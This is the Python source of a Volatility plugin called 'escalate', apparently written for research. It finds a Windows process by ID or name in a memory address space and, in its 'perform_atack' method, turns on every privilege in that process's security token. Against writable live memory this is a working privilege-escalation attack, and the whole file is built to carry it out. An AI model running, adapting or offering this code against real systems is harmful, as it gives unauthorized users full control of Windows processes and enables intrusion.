# Volatility
#
# Authors
# Adam Traub <traubad@vcu.edu>
#
# This file is part of Volatility.
#
# Volatility is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# Volatility is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Volatility.  If not, see <http://www.gnu.org/licenses/>.
#

import volatility.obj as obj
import volatility.debug as debug

import volatility.plugins.common as common
import volatility.utils as utils
import volatility.win32 as win32


class escalate(common.AbstractWindowsCommand):

    def __init__(self, config, *args, **kwargs):
        common.AbstractWindowsCommand.__init__(self, config, *args, **kwargs)

        self._config.add_option('PID', short_option='i', type="int", default=None,
            help='ID of Process to Escalate', action='store')

        self._config.add_option('NAME', short_option='n', type='string', default=None, help='Name of Process to Escalate', action='store')

        if self._config.PID is None and self._config.NAME is None:
            raise(Exception("Either a process id or a Process name is required e.g." +
                            "\nescalate -i 1104" +
                            "\nescalate -n cmd.exe"))

        self._addrspace = None
        self._proc = None

    def get_target_proc(self, pid):
        procs = win32.tasks.pslist(self._addrspace)

        for proc in procs:
            if proc.UniqueProcessId.v() == pid:
                offset = proc.v()
                break

        return obj.Object("_EPROCESS", offset=offset, vm=self._addrspace)


    def perform_atack(self):
        token = self._proc.get_token()
        token.Privileges.Enabled = 0xFFFFFFFFFFFFFFFF


    def get_pid_from_name(self, name):
        for proc in win32.tasks.pslist(self._addrspace):
            if str(proc.ImageFileName) == name:
                return proc.UniqueProcessId.v()
        else:
            raise(Exception("Bad Process name: {}".format(name)))


    def render_text(self, outfd, data):
        self._addrspace = utils.load_as(self._config)
        pid = self._config.PID

        if pid is None:
            pid = self.get_pid_from_name(self._config.NAME)

        self._proc = self.get_target_proc(pid)

        self.perform_atack()
        # print self._proc.get_token().Privileges.Enabled
        # outfd.write("Pid: {}\n".format(pid))
        # outfd.write("Current context: {0} @ {1:#x}, pid={2}, ppid={3} DTB={4:#x}\n".format(self._proc.ImageFileName,
        #                                                                                  self._proc.obj_offset,
        #                                                                                  self._proc.UniqueProcessId.v(),
        #                                                                                  self._proc.InheritedFromUniqueProcessId.v(),
        #                                                                                  self._proc.Pcb.DirectoryTableBase.v()).format(pid))
